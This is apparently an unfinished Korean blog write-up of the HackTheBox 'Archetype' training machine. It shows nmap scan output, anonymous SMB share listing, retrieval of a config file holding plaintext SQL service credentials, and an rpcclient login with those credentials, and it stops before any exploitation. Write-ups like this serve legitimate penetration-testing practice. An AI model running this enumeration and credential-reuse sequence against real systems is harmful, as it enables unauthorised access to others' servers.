---
title: HTB Archetype Write-up
categories: [HackTheBox, Basic]
tags: [HackTheBox]
image:
    path: /assets/image_post/20240216110334.png
draft: true
---
![](../assets/image_post/20240216110356.png)

우선 nmap으로 먼저 스캔해보자. 아래와 같이 탐지 내역이 꽤 많다. `rpc`, `smb`, `mssql` 관련된 port가 활성화 되어있는 것을 알 수 있다.
``` bash
┌──(root㉿kali)-[/home/user]
└─# nmap -sC -sV 10.129.241.210
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 21:04 EST
Nmap scan report for 10.129.241.210
Host is up (0.27s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.129.241.210:1433:
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.129.241.210:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-02-16T02:01:50
|_Not valid after:  2054-02-16T02:01:50
|_ssl-date: 2024-02-16T02:05:04+00:00; +1s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-02-15T18:04:50-08:00
|_clock-skew: mean: 1h36m01s, deviation: 3h34m42s, median: 0s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2024-02-16T02:04:46
|_  start_date: N/A
```

smbclient를 통해 어떤 공유 항목이 있는지 확인해보자. 아래와 같이 backups가 존재한다.
``` bash
┌──(root㉿kali)-[/home/user]
└─# smbclient -L 10.129.95.187 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
```

접속해보니 'prod.dtsConfig' 란 파일이 존재하고 있기에 다운로드하였다.
> .dtsConfig 파일은 직접적으로 SQL Server에 접속하기 위한 것이 아니라, SQL Server Integration Services (SSIS) 패키지의 실행에 필요한 구성 정보를 저장하는 파일이다.
``` bash
┌──(root㉿kali)-[/home/user]
└─# smbclient -N //10.129.95.187/backups
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 07:20:57 2020
  ..                                  D        0  Mon Jan 20 07:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020

                5056511 blocks of size 4096. 2515674 blocks available
smb: \> get prod.dtsConfig
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
```

sql 계정으로 추청되는 id, pw 값 획득이 가능하다. 
``` xml
┌──(root㉿kali)-[/home/user]
└─# cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

???  획득한 정보를 갖고 mssql에 연결을 시도해보자. `pip install mssql-cli` 명령어를 통해 설치 후 아래와 같이 접속을 한다.


rpcclient로 해당 계정으로 접근해보았더니, 접근이 된다. mssql의 그것이 아닌가?
``` bash
┌──(root㉿kali)-[/home/user]
└─# rpcclient -U sql_svc 10.129.95.187
Password for [WORKGROUP\sql_svc]:
rpcclient $> srvinfo
        10.129.95.187  Wk Sv Sql NT SNT PtB LMB
        platform_id     :       500
        os version      :       10.0
        server type     :       0x59007
```